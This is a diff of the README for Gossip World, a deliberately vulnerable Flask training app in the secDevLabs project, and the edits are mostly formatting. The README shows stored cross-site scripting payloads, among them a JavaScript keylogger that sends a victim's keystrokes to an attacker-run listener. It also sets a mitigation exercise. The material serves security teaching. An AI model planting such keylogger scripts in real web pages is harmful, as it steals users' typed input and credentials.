@@ -4,7 +4,7 @@
     <img src="images/banner.png"/>
 </p>
 
-Gossip World is a simple Flask app that contains an example of multiple Cross-Site Scripting vulnerabilities and its main goal is to describe how a malicious user could exploit them on this purposefully vulnerable app.
+Gossip World is a simple Flask app that contains an example of multiple Injection (XSS) vulnerabilities and its main goal is to describe how a malicious user could exploit them on this purposefully vulnerable app.
 
 ## Index
 
@@ -23,7 +23,7 @@ The main goal of this app is to discuss how **Cross-Site Scripting** vulnerabili
 
 ## Setup
 
-To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
+To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
 ```sh
 cd secDevLabs/owasp-top10-2017-apps/a7/gossip-world
@@ -33,7 +33,7 @@ cd secDevLabs/owasp-top10-2017-apps/a7/gossip-world
 make install
 ```
 
-Then simply visit [localhost:10007][App] ! 😆
+Then simply visit [localhost:10007][app] ! 😆
 
 ## Get to know the app 💄
 
@@ -53,24 +53,23 @@ Now that you know the purpose of this app, what could go wrong? The following se
 
 #### Non-sanitization of user input allows for cross-site scripting
 
-After inspecting the application, it is possible to identify that some entries are not sanitized and can be executed on a web browser. It occurs on *search*, *comment* and *post* fields. The following images show this behavior when the following text  is used as an input on these fields:
+After inspecting the application, it is possible to identify that some entries are not sanitized and can be executed on a web browser. It occurs on _search_, _comment_ and _post_ fields. The following images show this behavior when the following text is used as an input on these fields:
 
 ```
 <script>alert(1)</script>
 ```
 
 Searching for a post:
-   <img src="images/attack-1.png" align="center"/>
-   <img src="images/attack-2.png" align="center"/>
+<img src="images/attack-1.png" align="center"/>
+<img src="images/attack-2.png" align="center"/>
 
 Adding a new comment to a post:
-   <img src="images/attack-3.png" align="center"/>
-   <img src="images/attack-4.png" align="center"/>
+<img src="images/attack-3.png" align="center"/>
+<img src="images/attack-4.png" align="center"/>
 
 Adding a new post:
-   <img src="images/attack-5.png" align="center"/>
-   <img src="images/attack-6.png" align="center"/>
-
+<img src="images/attack-5.png" align="center"/>
+<img src="images/attack-6.png" align="center"/>
 
 The missing input validation allows a malicious user to insert some scripts that will persist in the server and be executed on the victims' browser every time they access the routes that contain these scripts.
 
@@ -99,8 +98,8 @@ func handler(c echo.Context) error {
    return nil
 }
 ```
-   
-To run this code simply type the following command in your terminal (you should check this [guide](https://golang.org/doc/install) if you need any help with Golang): 
+
+To run this code simply type the following command in your terminal (you should check this [guide](https://golang.org/doc/install) if you need any help with Golang):
 
 ```sh
 go run main.go
@@ -110,13 +109,13 @@ Then, the attacker can insert a new post through the **/newgossip** route by usi
 
 ```html
 <script>
-var k="";
-document.onkeypress=function(e) {
-   e = e || window.event;
-   k+=e.key;
-   var i=new Image;
-   i.src="http://localhost:1232/"+k;
-}
+  var k = "";
+  document.onkeypress = function (e) {
+    e = e || window.event;
+    k += e.key;
+    var i = new Image();
+    i.src = "http://localhost:1232/" + k;
+  };
 </script>
 ```
 
@@ -128,7 +127,7 @@ When a victim accesses the post, the browser will interpret the text between the
 
 <img src="images/attack-8.png" align="center"/>
 
-The attacker now gets all the input on the server log, as shown below: 
+The attacker now gets all the input on the server log, as shown below:
 
 <img src="images/attack-9.png" align="center"/>
 
@@ -136,7 +135,7 @@ The attacker now gets all the input on the server log, as shown below:
 
 How would you mitigate this vulnerability? After your changes, an attacker should not be able to:
 
-* Execute scripts through input fields
+- Execute scripts through input fields
 
 ## PR solutions
 
@@ -146,6 +145,6 @@ How would you mitigate this vulnerability? After your changes, an attacker shoul
 
 We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
-[Docker Install]:  https://docs.docker.com/install/
-[Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost:10007
+[docker install]: https://docs.docker.com/install/
+[docker compose install]: https://docs.docker.com/compose/install/
+[app]: http://localhost:10007
